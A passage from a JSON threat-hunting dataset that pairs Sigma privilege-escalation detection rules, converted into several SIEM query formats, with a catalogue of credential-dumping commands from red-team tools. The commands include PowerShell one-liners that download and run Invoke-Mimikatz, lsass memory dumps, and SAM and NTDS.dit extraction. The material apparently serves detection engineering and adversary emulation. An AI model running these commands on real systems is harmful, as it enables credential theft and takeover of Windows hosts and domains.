detection - privilege escalation fro Service accounts to SYSTEM\nid: 6c5808ee-85a2-4e56-8137-72e5876a5096\ndescription: Detection of child processes spawned with SYSTEM privileges by parents with LOCAL SERVICE or NETWORK SERVICE privileges\nreferences:\n    - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment\n    - https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/\ntags:\n    - attack.privilege_escalation\n    - attack.t1134\nstatus: experimental\nauthor: Teymur Kheirkhabarov\ndate: 2019/10/26\nmodified: 2019/11/11\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentUser:\n            - 'NT AUTHORITY\\NETWORK SERVICE'\n            - 'NT AUTHORITY\\LOCAL SERVICE'\n        User: 'NT AUTHORITY\\SYSTEM'\n    rundllexception:\n        Image|endswith: '\\rundll32.exe'\n        CommandLine|contains: 'DavSetCookie'\n    condition: selection and not rundllexception\nfalsepositives:\n    - Unknown\nlevel: high\nenrichment:\n    - EN_0001_cache_sysmon_event_id_1_info                # http://bit.ly/314zc6x\n    - EN_0002_enrich_sysmon_event_id_1_with_parent_info   # http://bit.ly/2KmSC0l", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Possible Rotten Potato detection - privilege escalation fro Service accounts to SYSTEM\nid: 6c5808ee-85a2-4e56-8137-72e5876a5096\ndescription: Detection of child processes spawned with SYSTEM privileges by parents with LOCAL SERVICE or NETWORK SERVICE privileges\nreferences:\n    - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment\n    - https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/\ntags:\n    - attack.privilege_escalation\n    - attack.t1134\nstatus: experimental\nauthor: Teymur Kheirkhabarov\ndate: 2019/10/26\nmodified: 2019/11/11\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentUser:\n            - 'NT AUTHORITY\\NETWORK SERVICE'\n            - 'NT AUTHORITY\\LOCAL SERVICE'\n        User: 'NT AUTHORITY\\SYSTEM'\n    rundllexception:\n        Image|endswith: '\\rundll32.exe'\n        CommandLine|contains: 'DavSetCookie'\n    condition: selection and not rundllexception\nfalsepositives:\n    - Unknown\nlevel: high\nenrichment:\n    - EN_0001_cache_sysmon_event_id_1_info                # http://bit.ly/314zc6x\n    - EN_0002_enrich_sysmon_event_id_1_with_parent_info   # http://bit.ly/2KmSC0l", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((ParentUser:(\"NT\\\\ AUTHORITY\\\\\\\\NETWORK\\\\ SERVICE\" OR \"NT\\\\ AUTHORITY\\\\\\\\LOCAL\\\\ SERVICE\") AND User:\"NT\\\\ AUTHORITY\\\\\\\\SYSTEM\") AND (NOT (Image.keyword:*\\\\\\\\rundll32.exe AND CommandLine.keyword:*DavSetCookie*)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Possible-Rotten-Potato-detection---privilege-escalation-fro-Service-accounts-to-SYSTEM <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Possible Rotten Potato detection - privilege escalation fro Service accounts to SYSTEM\",\\n    \"description\": \"Detection of child processes spawned with SYSTEM privileges by parents with LOCAL SERVICE or NETWORK SERVICE privileges\",\\n    \"tags\": [\\n      \"attack.privilege_escalation\",\\n      \"attack.t1134\"\\n    ],\\n    \"query\": \"((ParentUser:(\\\\\"NT\\\\\\\\ AUTHORITY\\\\\\\\\\\\\\\\NETWORK\\\\\\\\ SERVICE\\\\\" OR \\\\\"NT\\\\\\\\ AUTHORITY\\\\\\\\\\\\\\\\LOCAL\\\\\\\\ SERVICE\\\\\") AND User:\\\\\"NT\\\\\\\\ AUTHORITY\\\\\\\\\\\\\\\\SYSTEM\\\\\") AND (NOT (Image.keyword:*\\\\\\\\\\\\\\\\rundll32.exe AND CommandLine.keyword:*DavSetCookie*)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((ParentUser:(\\\\\"NT\\\\\\\\ AUTHORITY\\\\\\\\\\\\\\\\NETWORK\\\\\\\\ SERVICE\\\\\" OR \\\\\"NT\\\\\\\\ AUTHORITY\\\\\\\\\\\\\\\\LOCAL\\\\\\\\ SERVICE\\\\\") AND User:\\\\\"NT\\\\\\\\ AUTHORITY\\\\\\\\\\\\\\\\SYSTEM\\\\\") AND (NOT (Image.keyword:*\\\\\\\\\\\\\\\\rundll32.exe AND CommandLine.keyword:*DavSetCookie*)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Possible Rotten Potato detection - privilege escalation fro Service accounts to SYSTEM\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((ParentUser:(\"NT AUTHORITY\\\\\\\\NETWORK SERVICE\" \"NT AUTHORITY\\\\\\\\LOCAL SERVICE\") AND User:\"NT AUTHORITY\\\\\\\\SYSTEM\") AND (NOT (Image.keyword:*\\\\\\\\rundll32.exe AND CommandLine.keyword:*DavSetCookie*)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(((ParentUser=\"NT AUTHORITY\\\\\\\\NETWORK SERVICE\" OR ParentUser=\"NT AUTHORITY\\\\\\\\LOCAL SERVICE\") User=\"NT AUTHORITY\\\\\\\\SYSTEM\") NOT (Image=\"*\\\\\\\\rundll32.exe\" CommandLine=\"*DavSetCookie*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (ParentUser IN [\"NT AUTHORITY\\\\\\\\NETWORK SERVICE\", \"NT AUTHORITY\\\\\\\\LOCAL SERVICE\"] User=\"NT AUTHORITY\\\\\\\\SYSTEM\")  -(Image=\"*\\\\\\\\rundll32.exe\" CommandLine=\"*DavSetCookie*\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*(?:.*NT AUTHORITY\\\\NETWORK SERVICE|.*NT AUTHORITY\\\\LOCAL SERVICE))(?=.*NT AUTHORITY\\\\SYSTEM)))(?=.*(?!.*(?:.*(?=.*.*\\\\rundll32\\\\.exe)(?=.*.*DavSetCookie.*)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Possible privilege escalation via weak service permissions\nid: d937b75f-a665-4480-88a5-2f20e9f9b22a\ndescription: Detection of sc.exe utility spawning by user with Medium integrity level to change service ImagePath or FailureCommand\nreferences:\n    - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment\n    - https://pentestlab.blog/2017/03/30/weak-service-permissions/\ntags:\n    - attack.privilege_escalation\n    - attack.t1134\nstatus: experimental\nauthor: Teymur Kheirkhabarov\ndate: 2019/10/26\nmodified: 2019/11/11\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    scbynonadmin:\n        Image|endswith: '\\sc.exe'\n        IntegrityLevel: 'Medium'\n    binpath:\n        CommandLine|contains|all:\n            - 'config'\n            - 'binPath'\n    failurecommand:\n        CommandLine|contains|all: \n            - 'failure'\n            - 'command'\n    condition: scbynonadmin and (binpath or failurecommand)\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Possible privilege escalation via weak service permissions\nid: d937b75f-a665-4480-88a5-2f20e9f9b22a\ndescription: Detection of sc.exe utility spawning by user with Medium integrity level to change service ImagePath or FailureCommand\nreferences:\n    - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment\n    - https://pentestlab.blog/2017/03/30/weak-service-permissions/\ntags:\n    - attack.privilege_escalation\n    - attack.t1134\nstatus: experimental\nauthor: Teymur Kheirkhabarov\ndate: 2019/10/26\nmodified: 2019/11/11\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    scbynonadmin:\n        Image|endswith: '\\sc.exe'\n        IntegrityLevel: 'Medium'\n    binpath:\n        CommandLine|contains|all:\n            - 'config'\n            - 'binPath'\n    failurecommand:\n        CommandLine|contains|all: \n            - 'failure'\n            - 'command'\n    condition: scbynonadmin and (binpath or failurecommand)\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((Image.keyword:*\\\\\\\\sc.exe AND IntegrityLevel:\"Medium\") AND ((CommandLine.keyword:*config* AND CommandLine.keyword:*binPath*) OR (CommandLine.keyword:*failure* AND CommandLine.keyword:*command*)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Possible-privilege-escalation-via-weak-service-permissions <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Possible privilege escalation via weak service permissions\",\\n    \"description\": \"Detection of sc.exe utility spawning by user with Medium integrity level to change service ImagePath or FailureCommand\",\\n    \"tags\": [\\n      \"attack.privilege_escalation\",\\n      \"attack.t1134\"\\n    ],\\n    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\sc.exe AND IntegrityLevel:\\\\\"Medium\\\\\") AND ((CommandLine.keyword:*config* AND CommandLine.keyword:*binPath*) OR (CommandLine.keyword:*failure* AND CommandLine.keyword:*command*)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\sc.exe AND IntegrityLevel:\\\\\"Medium\\\\\") AND ((CommandLine.keyword:*config* AND CommandLine.keyword:*binPath*) OR (CommandLine.keyword:*failure* AND CommandLine.keyword:*command*)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Possible privilege escalation via weak service permissions\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((Image.keyword:*\\\\\\\\sc.exe AND IntegrityLevel:\"Medium\") AND ((CommandLine.keyword:*config* AND CommandLine.keyword:*binPath*) OR (CommandLine.keyword:*failure* AND CommandLine.keyword:*command*)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Image=\"*\\\\\\\\sc.exe\" IntegrityLevel=\"Medium\") ((CommandLine=\"*config*\" CommandLine=\"*binPath*\") OR (CommandLine=\"*failure*\" CommandLine=\"*command*\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"*\\\\\\\\sc.exe\" IntegrityLevel=\"Medium\" ((CommandLine=\"*config*\" CommandLine=\"*binPath*\") OR (CommandLine=\"*failure*\" CommandLine=\"*command*\")))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*.*\\\\sc\\\\.exe)(?=.*Medium)))(?=.*(?:.*(?:.*(?:.*(?=.*.*config.*)(?=.*.*binPath.*))|.*(?:.*(?=.*.*failure.*)(?=.*.*command.*))))))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "hashdump\nmimikatz !lsadump::sam", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "hashdump\nrun hashdump\nrun smart_hashdump\npost/windows/gather/credentials/domain_hashdump", "name": "Metasploit"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "logonpasswords\nmimikatz !sekurlsa::logonpasswords\nmimikatz !sekurlsa::msv\nmimikatz !sekurlsa::kerberos\nmimikatz !sekurlsa::wdigest", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "use mimikatz\nwdigest\nmsv\nkerberos\nlogonpasswords", "name": "Metasploit"}, {"source": "atomics/T1003/T1003.yaml", "command": "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "#{gsecdump_exe} -a\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "PathToAtomicsFolder\\T1003\\bin\\gsecdump.exe -a\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "#{gsecdump_exe} -a\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "PathToAtomicsFolder\\T1003\\bin\\wce.exe -o #{output_file}\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "PathToAtomicsFolder\\T1003\\bin\\wce.exe -o #{output_file}\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "#{wce_exe} -o %temp%\\output.txt\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "#{wce_exe} -o %temp%\\output.txt\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "reg save HKLM\\sam %temp%\\sam\nreg save HKLM\\system %temp%\\system\nreg save HKLM\\security %temp%\\security\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "#{procdump_exe} -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "PathToAtomicsFolder\\T1003\\bin\\procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "PathToAtomicsFolder\\T1003\\bin\\mimikatz.exe \"sekurlsa::minidump #{input_file}\" \"sekurlsa::logonpasswords full\" exit\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "PathToAtomicsFolder\\T1003\\bin\\mimikatz.exe \"sekurlsa::minidump %tmp%\\lsass.DMP\" \"sekurlsa::logonpasswords full\" exit\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\" q q\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "vssadmin.exe create shadow /for=C:\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit #{extract_path}\\ntds.dit\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM #{extract_path}\\VSC_SYSTEM_HIVE\nreg save HKLM\\SYSTEM #{extract_path}\\SYSTEM_HIVE\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\Windows\\Temp\\ntds.dit\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Windows\\Temp\\VSC_SYSTEM_HIVE\nreg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM_HIVE\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "findstr /S cpassword %logonserver%\\sysvol\\*.xml\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": ". PathToAtomicsFolder\\T1003\\src\\Get-GPPPassword.ps1\nGet-GPPPassword -Verbose\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": ". PathToAtomicsFolder\\T1003\\src\\Get-GPPPassword.ps1\nGet-GPPPassword -Verbose\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "pypykatz live lsa\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "pypykatz live registry\n", "name": null}, {"source": "data/abilities/credential-access/0360ede1-3c28-48d3-a6ef-6e98f562c5af.yml", "command": {"windows": {"psh": {"command": "Import-Module .\\PowerView.ps1 -Force;\nGet-NetComputer\n", "payload": "powerview.ps1"}}}, "name": "Get a list of all computers in a domain"}, {"source": "data/abilities/credential-access/0ef4cc7b-611c-4237-b20b-db36b6906554.yml", "command": {"windows": {"psh": {"command": "$ps_url = \"https://download.sysinternals.com/files/Procdump.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"Procdump.zip\" -DestinationPath $staging_folder;\n$arch=[System.Environment]::Is64BitOperatingSystem;\n\nif ($arch) {\n    iex $staging_folder\"\\procdump64.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n} else {\n    iex $staging_folder\"\\procdump.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n}\nremove-item $staging_folder -Recurse;\n"}}}, "name": "Dump lsass for later use with mimikatz"}, {"source": "data/abilities/credential-access/3c647015-ab0a-496a-8847-6ab173cd2b22.yml", "command": {"windows": {"psh": {"command": ".\\totallylegit.exe #{host.process.id} C:\\Users\\Public\\creds.dmp\n", "payload": "totallylegit.exe"}}}, "name": "Custom GO credential dumper using minidumpwritedump"}, {"source": "data/abilities/credential-access/7049e3ec-b822-4fdf-a4ac-18190f9b66d1.yml", "command": {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.katz": [{"source": "domain.user.name", "edge": "has_password", "target": "domain.user.password"}]}, "command": "Import-Module .\\invoke-mimi.ps1;\nInvoke-Mimikatz -DumpCreds\n", "payload": "invoke-mimi.ps1"}}}, "name": "Use Invoke-Mimikatz"}, {"source": "data/abilities/credential-access/98e58fc4-3843-4511-89b1-50cb872e0c9b.yml", "command": {"windows": {"psh": {"command": "reg query HKLM /f password /t REG_SZ /s\n"}}}, "name": "Search for possible credentials stored in the HKLM Hive"}, {"source": "data/abilities/credential-access/baac2c6d-4652-4b7e-ab0a-f1bf246edd12.yml", "command": {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.katz": [{"source": "domain.user.name", "edge": "has_password", "target": "domain.user.password"}]}, "command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadString(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1\");\niex $result; Invoke-Mimikatz -DumpCreds\n"}}}, "name": "Use powerkatz to execute mimikatz and attempt to grab plaintext and/or hashed passwords"}, {"source": "Threat Hunting Tables", "command": "ntdsutil.exe", "name": "parent_process"}, {"source": "SysmonHunter - Credential Dumping", "command": "\\\\Windows\\\\.+\\\\lsass.exeHKLM\\SAM|HKLM\\Security", "name": null}, {"source": "SysmonHunter - Credential Dumping", "command": "\\\\Windows\\\\.+\\\\bcryptprimitives.dll|\\\\Windows\\\\.+\\\\bcrypt.dll|\\\\Windows\\\\.+\\\\ncrypt.dll", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/ChromeDump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/ChromeDump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/FoxDump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/FoxDump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/ninjacopy", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/ninjacopy", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/vaults/add_keepass_config_trigger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/vaults/add_keepass_config_trigger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/vaults/find_keepass_config", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/vaults/find_keepass_config", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/vaults/get_keepass_config_trigger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/vaults/get_keepass_config_trigger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/vaults/keethief", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/vaults/keethief", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/vaults/remove_keepass_config_trigger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/vaults/remove_keepass_config_trigger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/enum_cred_store", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/enum_cred_store", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/cache", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/cache", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/command", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/command", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/dcsync", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/dcsync", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/dcsync_hashdump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/dcsync_hashdump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/extract_tickets", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/extract_tickets", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/golden_ticket", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/golden_ticket", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/logonpasswords", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/logonpasswords", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/lsadump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/lsadump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/mimitokens", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/mimitokens", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/sam", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/sam", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/silver_ticket", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/silver_ticket", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/trust_keys", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/trust_keys", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/powerdump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/powerdump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/vault_credential", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/vault_credential", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/downgrade_account", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/downgrade_account", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/wdigest_downgrade", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/wdigest_downgrade", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/gpp", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/gpp", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/mcafee_sitelist", "name": "Empire Module Command"}, {"source": 